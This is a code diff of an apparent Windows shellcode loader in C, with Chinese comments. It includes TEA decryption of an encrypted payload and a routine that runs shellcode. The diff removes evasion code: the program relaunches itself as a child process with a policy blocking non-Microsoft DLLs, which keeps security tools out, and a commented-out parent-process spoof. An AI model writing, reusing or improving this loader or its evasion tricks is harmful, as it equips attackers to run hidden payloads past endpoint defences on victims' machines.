@@ -52,72 +52,6 @@ struct ConfigurationData {
 ******/
 
 
-//获取当前进程父进程
-DWORD getParentPID(DWORD pid)
-{
-	HANDLE h = NULL;
-	PROCESSENTRY32 pe = { 0 };
-	DWORD ppid = 0;
-	pe.dwSize = sizeof(PROCESSENTRY32);
-	h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-	if (Process32First(h, &pe))
-	{
-		do
-		{
-			if (pe.th32ProcessID == pid)
-			{
-				ppid = pe.th32ParentProcessID;
-				break;
-			}
-		} while (Process32Next(h, &pe));
-	}
-	CloseHandle(h);
-	return (ppid);
-}
-
-//根据进程ID获取进程名
-int getProcessName(DWORD pid, LPSTR fname, DWORD sz)
-{
-	HANDLE h = NULL;
-	int e = 0;
-	h = OpenProcess
-	(
-		PROCESS_QUERY_INFORMATION,
-		FALSE,
-		pid
-	);
-	if (h)
-	{
-		if (GetProcessImageFileName(h, fname, sz) == 0)
-			e = GetLastError();
-		CloseHandle(h);
-	}
-	else
-	{
-		e = GetLastError();
-	}
-	return (e);
-}
-
-//判断当前是否是子进程
-bool GetPP()
-{
-	WORD pid, ppid;
-	int e;
-	char fname[MAX_PATH] = { 0 };
-	pid = GetCurrentProcessId();
-	ppid = getParentPID(pid);
-	e = getProcessName(ppid, fname, MAX_PATH);
-	char    processFullName[_MAX_PATH] = { 0 };
-	GetProcessImageFileName(GetCurrentProcess(), processFullName, _MAX_PATH);
-	//GetModuleFileNameA(NULL, processFullName, _MAX_PATH); //进程完整路径
-	if (strcmp(fname, processFullName) == 0)
-	{
-		return true;
-	}
-	return false;
-}
-
 //tea解密
 void decrypt_tea(unsigned long* in, unsigned long* key, unsigned long* out)
 {
@@ -333,7 +267,6 @@ int DecryptSC(struct ConfigurationData* config,unsigned char *encData,unsigned i
 	return 0;
 }
 
-
 //解析运行shellcode
 int RunSCFromPE(struct ConfigurationData* config)
 {
@@ -407,70 +340,9 @@ int main()
 	{
 		return 0;
 	}
-	
-	if (GetPP())
-	{
-		//自身子进程
-		if (RunSCFromPE(&config) < 0) {
-			return 1;
-		}
+	if (RunSCFromPE(&config) < 0) {
+		return 1;
 	}
-	else
-	{
-		//未创建子进程
-		STARTUPINFOEXA si;
-		PROCESS_INFORMATION pi;
-		SIZE_T size = 0;
-		BOOL ret;
-
-		// 请求一个 STARTUPINFOEXA 结构体
-		ZeroMemory(&si, sizeof(si));
-		si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
-		si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;
-
-		//获取要分配的 PROC_THREAD_ATTRIBUTE_LIST 大小
-		InitializeProcThreadAttributeList(NULL, 1, 0, &size);
-
-		//为 PROC_THREAD_ATTRIBUTE_LIST 分配内存
-		si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
-			GetProcessHeap(),
-			0,
-			size
-		);
-
-		// 初始化我们的列表 
-		InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
-
-		// 启用阻止未经Microsoft签名的DLL功能
-		DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
-
-		// Assign our attribute
-		UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);
-
-		//修改父进程
-		//HANDLE handle = GetCurrentProcess();
-		//if (!UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &handle, sizeof(HANDLE), NULL, NULL)) {
-		//	return 0;
-		//}
-		
-		// 创建进程
-		char    processFullName[_MAX_PATH] = { 0 };
-		GetModuleFileNameA(NULL, processFullName, _MAX_PATH); //进程完整路径
-		ret = CreateProcessA(
-			NULL,
-			(LPSTR)processFullName,
-			NULL,
-			NULL,
-			true,
-			EXTENDED_STARTUPINFO_PRESENT,
-			NULL,
-			NULL,
-			(LPSTARTUPINFOA)(&si),
-			&pi
-		);
-		WaitForSingleObject(pi.hProcess, INFINITE);
-	}
-
 	return 0;
 }
 
